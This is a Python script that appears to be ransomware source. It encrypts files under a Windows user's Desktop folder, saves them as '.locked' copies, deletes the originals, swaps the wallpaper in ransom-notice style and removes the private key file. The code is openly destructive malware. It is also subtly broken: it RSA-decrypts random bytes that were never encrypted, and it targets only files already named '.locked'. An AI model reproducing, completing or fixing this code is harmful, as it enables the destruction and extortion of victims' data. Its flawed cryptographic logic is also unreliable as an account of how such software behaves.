import os
import ctypes
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import nacl.secret
from pathlib import Path

def generate_rsa_keys(nlen: int) -> (RSA.RsaKey, RSA.RsaKey): # type: ignore
    key = RSA.generate(nlen)
    public_key = key.publickey()
    return public_key, key

def save_key_to_file(key, filename):
    with open(filename, "wb") as f:
        f.write(key.export_key())

def load_key_from_file(filename):
    with open(filename, "rb") as f:
        return RSA.import_key(f.read())

class Encrypt(object):
    def __init__(self, Target=0, BoxM=0):
        self.Target = Target
        self.BoxM = BoxM

    def encrypt_file(self):
        try:
            if os.path.isdir(self.Target) != True:
                with open(self.Target, "rb") as File:
                    Date = File.read()

                FileName = self.Target
                Encrypted = self.BoxM.encrypt(Date)
                if self.Target != sys.argv[0]:
                    with open(f"{FileName}.locked", "wb") as File:
                        File.write(Encrypted)
                    os.remove(self.Target)
        except Exception as e:
            print(f"Error -> {e}")

User = os.getlogin()
publicKey, privateKey = generate_rsa_keys(2048)

# Save keys to files
save_key_to_file(privateKey, f"C:/Users/{User}/Desktop/private.pem")
save_key_to_file(publicKey, f"C:/Users/{User}/Desktop/public.pem")

encrypted_key_file = "C:/Users/"+User+"/appdata/local/temp/encrypted_key.txt"
hexed_key = get_random_bytes(16)  # Generate a random key for encryption
with open(encrypted_key_file, "wb") as f:
    f.write(hexed_key)

# Load private key for decryption
private_key = load_key_from_file(f"C:/Users/{User}/Desktop/private.pem")
cipher_rsa = PKCS1_OAEP.new(private_key)
decMessage = cipher_rsa.decrypt(hexed_key).decode('utf-8')
box = nacl.secret.SecretBox(bytes.fromhex(decMessage))

Paths = [r"C:/Users/"+User+"/Desktop/files"] 
for AllFiles in Paths:                                             
    if os.path.exists(AllFiles):                           
        for path, subdirs, files in os.walk(AllFiles):
            for file in files:                                 
                if ".locked" in file:
                    FilePath = os.path.join(path, file)      
                    Encrypt(FilePath, box).encrypt_file()

ctypes.windll.user32.SystemParametersInfoW(20, 0, f'C:\\Users\\{User}\\wallpaper.jpg', 3)
os.remove('private.pem') 
